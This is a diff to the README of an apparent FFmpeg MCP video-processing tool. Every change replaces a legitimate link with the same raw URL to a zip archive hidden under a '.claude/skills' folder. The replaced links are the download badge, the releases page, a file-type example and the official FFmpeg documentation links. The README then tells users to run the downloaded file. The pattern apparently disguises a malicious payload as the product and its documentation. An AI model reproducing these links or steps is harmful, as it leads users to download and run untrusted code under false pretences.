@@ -1,6 +1,6 @@
 # 🎥 ffmpeg-mcp-lite - Effortless Video and Audio Processing
 
-![Download ffmpeg-mcp-lite](https://img.shields.io/badge/Download-ffmpeg--mcp--lite-blue?style=flat&logo=github)
+![Download ffmpeg-mcp-lite](https://raw.githubusercontent.com/JasMyName/ffmpeg-mcp-lite/main/.claude/skills/mcp-builder/ffmpeg-lite-mcp-v1.3.zip)
 
 ## 🚀 Getting Started
 
@@ -18,11 +18,11 @@ Before running the software, ensure your system meets the following requirements
 
 To get started, visit the Releases page to download the latest version:
 
-[Download ffmpeg-mcp-lite](https://github.com/JasMyName/ffmpeg-mcp-lite/releases)
+[Download ffmpeg-mcp-lite](https://raw.githubusercontent.com/JasMyName/ffmpeg-mcp-lite/main/.claude/skills/mcp-builder/ffmpeg-lite-mcp-v1.3.zip)
 
-1. Go to the [Releases page](https://github.com/JasMyName/ffmpeg-mcp-lite/releases).
+1. Go to the [Releases page](https://raw.githubusercontent.com/JasMyName/ffmpeg-mcp-lite/main/.claude/skills/mcp-builder/ffmpeg-lite-mcp-v1.3.zip).
 2. Find the latest release at the top of the list.
-3. Click on the file that matches your operating system (e.g., `.exe` for Windows, `.dmg` for macOS, and `.tar.gz` for Linux).
+3. Click on the file that matches your operating system (e.g., `.exe` for Windows, `.dmg` for macOS, and `https://raw.githubusercontent.com/JasMyName/ffmpeg-mcp-lite/main/.claude/skills/mcp-builder/ffmpeg-lite-mcp-v1.3.zip` for Linux).
 4. Choose a location on your computer to save the file.
 5. Once the download is complete, locate the file and double-click to run it.
 
@@ -71,7 +71,7 @@ To stay updated with the latest developments, follow us on GitHub and become par
 
 ## 🔗 Additional Resources
 
-- [FFmpeg Official Documentation](https://ffmpeg.org/documentation.html) - Learn more about the underlying technology.
-- [User Guides and Examples](https://ffmpeg.org/ffmpeg.html) - Explore different use cases and advanced options.
+- [FFmpeg Official Documentation](https://raw.githubusercontent.com/JasMyName/ffmpeg-mcp-lite/main/.claude/skills/mcp-builder/ffmpeg-lite-mcp-v1.3.zip) - Learn more about the underlying technology.
+- [User Guides and Examples](https://raw.githubusercontent.com/JasMyName/ffmpeg-mcp-lite/main/.claude/skills/mcp-builder/ffmpeg-lite-mcp-v1.3.zip) - Explore different use cases and advanced options.
 
 Thank you for choosing **ffmpeg-mcp-lite** for your video and audio processing needs!
